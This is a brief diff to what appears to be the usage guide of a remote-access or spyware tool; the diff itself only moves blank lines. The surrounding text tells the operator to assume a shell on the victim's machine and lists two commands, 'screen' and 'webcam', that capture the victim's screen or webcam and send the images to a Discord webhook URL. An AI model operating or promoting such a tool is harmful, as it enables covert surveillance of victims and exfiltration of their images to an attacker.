@@ -11,10 +11,10 @@ NOW ASSUME THAT IT'S THE SHELL...
 
 For Screenshot:
 
-
 [*] >> screen https://discord.com/api/webhooks/your_webhook_url_that_u_copied
 
 For Webcam:
+
 [*] >> webcam https://discord.com/api/webhooks/your_webhook_url_that_u_copied
 
 
